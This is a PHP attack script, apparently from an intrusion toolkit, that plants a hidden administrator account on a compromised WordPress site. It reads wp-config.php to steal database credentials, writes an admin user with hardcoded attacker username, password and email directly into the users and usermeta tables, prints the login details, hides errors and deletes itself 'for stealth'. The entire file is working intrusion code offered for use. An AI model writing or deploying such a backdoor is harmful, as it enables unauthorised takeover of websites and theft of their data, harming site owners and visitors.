<?php
/**
 * WordPress Auto Admin Creator
 * Run from shell: php wp_create_admin.php
 * Or access via browser: https://target.com/wp_create_admin.php
 * 
 * Creates new WordPress administrator account
 */

// ============================================
// CONFIGURATION - EDIT THIS
// ============================================
$new_username = 'bastian13';        // Username baru
$new_password = 'indohaxsec1337'; // Password baru
$new_email    = 'haxorsecv1@gmail.com'; // Email

// Optional: Delete after execution for stealth
$self_delete = true;

// ============================================
// MAIN SCRIPT
// ============================================
error_reporting(0);
@set_time_limit(0);

// Find wp-load.php
$wp_load_paths = [
    'wp-load.php',
    '../wp-load.php',
    '../../wp-load.php',
    '../../../wp-load.php',
    dirname(__FILE__) . '/wp-load.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php',
];

$wp_loaded = false;
foreach ($wp_load_paths as $path) {
    if (file_exists($path)) {
        require_once($path);
        $wp_loaded = true;
        break;
    }
}

// If WordPress not loaded, try manual MySQL method
if (!$wp_loaded || !function_exists('wp_create_user')) {
    create_admin_manual_mysql($new_username, $new_password, $new_email);
} else {
    create_admin_wordpress_api($new_username, $new_password, $new_email);
}

// ============================================
// METHOD 1: WordPress API
// ============================================
function create_admin_wordpress_api($username, $password, $email) {
    echo "<h3>WordPress Admin Creator</h3>\n";
    echo "<pre>\n";
    
    // Check if user exists
    if (username_exists($username)) {
        echo "[!] Username '$username' already exists!\n";
        
        // Try to update password
        $user = get_user_by('login', $username);
        if ($user) {
            wp_set_password($password, $user->ID);
            
            // Ensure admin role
            $user->set_role('administrator');
            
            echo "[+] Password updated for existing user '$username'\n";
            echo "[+] User is now Administrator\n";
            echo "========================================\n";
            echo "[+] Login URL: " . home_url('/wp-admin/') . "\n";
            echo "[+] Username: $username\n";
            echo "[+] Password: $password\n";
            echo "========================================\n";
        }
    } else {
        // Create new user
        $user_id = wp_create_user($username, $password, $email);
        
        if (is_wp_error($user_id)) {
            echo "[-] Error: " . $user_id->get_error_message() . "\n";
        } else {
            // Set as administrator
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            echo "Administrator account created successfully!\n";
            echo "========================================\n";
            echo "Site URL: " . home_url() . "\n";
            echo "Login URL: " . wp_login_url() . "\n";
            echo "Username: $username\n";
            echo "Password: $password\n";
            echo "Email: $email\n";
            echo "User ID: $user_id\n";
            echo "========================================\n";
        }
    }
    
    echo "</pre>\n";
    
    // Cleanup
    global $self_delete;
    if ($self_delete) {
        @unlink(__FILE__);
        echo "<p><em>Script deleted for stealth.</em></p>\n";
    }
}

// ============================================
// METHOD 2: Manual MySQL (if WP not loaded)
// ============================================
function create_admin_manual_mysql($username, $password, $email) {
    echo "<h3>WordPress Admin Creator (MySQL Direct)</h3>\n";
    echo "<pre>\n";
    
    // Find wp-config.php
    $config_paths = [
        'wp-config.php',
        '../wp-config.php',
        '../../wp-config.php',
        '../../../wp-config.php',
        dirname(__FILE__) . '/wp-config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php',
    ];
    
    $config_found = false;
    foreach ($config_paths as $path) {
        if (file_exists($path)) {
            $config_content = file_get_contents($path);
            $config_found = true;
            break;
        }
    }
    
    if (!$config_found) {
        echo "[-] wp-config.php not found!\n";
        echo "[-] Try placing this script in WordPress root directory.\n";
        return;
    }
    
    // Extract database credentials
    preg_match("/define\(\s*'DB_NAME',\s*'([^']+)'\s*\)/", $config_content, $db_name);
    preg_match("/define\(\s*'DB_USER',\s*'([^']+)'\s*\)/", $config_content, $db_user);
    preg_match("/define\(\s*'DB_PASSWORD',\s*'([^']+)'\s*\)/", $config_content, $db_pass);
    preg_match("/define\(\s*'DB_HOST',\s*'([^']+)'\s*\)/", $config_content, $db_host);
    
    // Extract table prefix
    preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_content, $table_prefix);
    $prefix = isset($table_prefix[1]) ? $table_prefix[1] : 'wp_';
    
    if (empty($db_name[1]) || empty($db_user[1]) || empty($db_pass[1])) {
        echo "[-] Could not extract database credentials!\n";
        return;
    }
    
    $db = [
        'name' => $db_name[1],
        'user' => $db_user[1],
        'pass' => $db_pass[1],
        'host' => isset($db_host[1]) ? $db_host[1] : 'localhost',
        'prefix' => $prefix
    ];
    
    echo "[*] Database: {$db['name']}\n";
    echo "[*] Prefix: {$db['prefix']}\n";
    
    // Connect to MySQL
    $mysqli = @new mysqli($db['host'], $db['user'], $db['pass'], $db['name']);
    
    if ($mysqli->connect_error) {
        echo "[-] MySQL connection failed: " . $mysqli->connect_error . "\n";
        
        // Try socket
        $mysqli = @new mysqli('localhost', $db['user'], $db['pass'], $db['name'], null, '/var/run/mysqld/mysqld.sock');
        if ($mysqli->connect_error) {
            echo "[-] Socket connection also failed.\n";
            return;
        }
    }
    
    echo "[+] MySQL connected!\n";
    
    // Check if user exists
    $user_table = $db['prefix'] . 'users';
    $check_query = "SELECT ID FROM `$user_table` WHERE user_login = '$username' LIMIT 1";
    $result = $mysqli->query($check_query);
    
    // Generate WordPress password hash
    require_once 'wp-includes/class-phpass.php';
    
    if (!class_exists('PasswordHash')) {
        // Fallback password hasher
        $hash = fallback_password_hash($password);
    } else {
        $hasher = new PasswordHash(8, true);
        $hash = $hasher->HashPassword($password);
    }
    
    if ($result && $result->num_rows > 0) {
        // User exists, update password
        $row = $result->fetch_assoc();
        $user_id = $row['ID'];
        
        $update_query = "UPDATE `$user_table` SET user_pass = '$hash' WHERE ID = $user_id";
        if ($mysqli->query($update_query)) {
            echo "[+] Password updated for existing user '$username'\n";
        }
        
        // Ensure admin role in usermeta
        $meta_table = $db['prefix'] . 'usermeta';
        $capabilities = serialize(['administrator' => true]);
        
        $check_meta = "SELECT umeta_id FROM `$meta_table` WHERE user_id = $user_id AND meta_key = '{$db['prefix']}capabilities'";
        $meta_result = $mysqli->query($check_meta);
        
        if ($meta_result->num_rows > 0) {
            $update_meta = "UPDATE `$meta_table` SET meta_value = '$capabilities' WHERE user_id = $user_id AND meta_key = '{$db['prefix']}capabilities'";
            $mysqli->query($update_meta);
        } else {
            $insert_meta = "INSERT INTO `$meta_table` (user_id, meta_key, meta_value) VALUES ($user_id, '{$db['prefix']}capabilities', '$capabilities')";
            $mysqli->query($insert_meta);
        }
        
        // Set user level
        $check_level = "SELECT umeta_id FROM `$meta_table` WHERE user_id = $user_id AND meta_key = '{$db['prefix']}user_level'";
        $level_result = $mysqli->query($check_level);
        
        if ($level_result->num_rows > 0) {
            $mysqli->query("UPDATE `$meta_table` SET meta_value = '10' WHERE user_id = $user_id AND meta_key = '{$db['prefix']}user_level'");
        } else {
            $mysqli->query("INSERT INTO `$meta_table` (user_id, meta_key, meta_value) VALUES ($user_id, '{$db['prefix']}user_level', '10')");
        }
        
    } else {
        // Create new user
        $registered = date('Y-m-d H:i:s');
        $user_url = '';
        $display_name = ucfirst($username);
        $user_status = 0;
        
        $insert_user = "INSERT INTO `$user_table` 
            (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) 
            VALUES 
            ('$username', '$hash', '$username', '$email', '$user_url', '$registered', $user_status, '$display_name')";
        
        if ($mysqli->query($insert_user)) {
            $user_id = $mysqli->insert_id;
            echo "[+] New user created! ID: $user_id\n";
            
            // Insert user meta
            $meta_table = $db['prefix'] . 'usermeta';
            $capabilities = serialize(['administrator' => true]);
            
            $meta_inserts = [
                "('$user_id', '{$db['prefix']}capabilities', '$capabilities')",
                "('$user_id', '{$db['prefix']}user_level', '10')",
                "('$user_id', 'nickname', '$username')",
                "('$user_id', 'first_name', '')",
                "('$user_id', 'last_name', '')",
                "('$user_id', 'description', '')",
                "('$user_id', 'rich_editing', 'true')",
                "('$user_id', 'syntax_highlighting', 'true')",
                "('$user_id', 'comment_shortcuts', 'false')",
                "('$user_id', 'admin_color', 'fresh')",
                "('$user_id', 'use_ssl', '0')",
                "('$user_id', 'show_admin_bar_front', 'true')",
                "('$user_id', 'locale', '')",
                "('$user_id', '{$db['prefix']}dashboard_quick_press_last_post_id', '0')",
            ];
            
            foreach ($meta_inserts as $meta) {
                $mysqli->query("INSERT INTO `$meta_table` (user_id, meta_key, meta_value) VALUES $meta");
            }
            
            echo "[+] User meta added!\n";
        } else {
            echo "[-] Failed to create user: " . $mysqli->error . "\n";
            $mysqli->close();
            return;
        }
    }
    
    $mysqli->close();
    
    // Get site URL
    $site_url = get_site_url_from_config($config_content);
    
    echo "========================================\n";
    echo "Administrator account ready!\n";
    echo "Site URL: $site_url\n";
    echo "Login URL: $site_url/wp-admin/\n";
    echo "Username: $username\n";
    echo "Password: $password\n";
    echo "========================================\n";
    echo "</pre>\n";
    
    // Self delete
    global $self_delete;
    if ($self_delete) {
        @unlink(__FILE__);
        echo "<p><em>Script deleted for stealth.</em></p>\n";
    }
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function fallback_password_hash($password) {
    // Simple phpass compatible hash for fallback
    if (!function_exists('crypt')) {
        return md5($password);
    }
    
    $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $iteration_count_log2 = 8;
    $salt = '';
    
    for ($i = 0; $i < 8; $i++) {
        $salt .= $itoa64[rand(0, 63)];
    }
    
    $setting = '$P$B' . $salt;
    $hash = crypt($password, $setting);
    
    if (strlen($hash) == 34) {
        return $hash;
    }
    
    return md5($password);
}

function get_site_url_from_config($config_content) {
    preg_match("/define\(\s*'WP_HOME',\s*'([^']+)'\s*\)/", $config_content, $wp_home);
    preg_match("/define\(\s*'WP_SITEURL',\s*'([^']+)'\s*\)/", $config_content, $wp_siteurl);
    
    if (isset($wp_home[1])) {
        return $wp_home[1];
    } elseif (isset($wp_siteurl[1])) {
        return $wp_siteurl[1];
    } else {
        // Detect from current URL
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
        return "$protocol://$host";
    }
}

// ============================================
// RUN
// ============================================
?>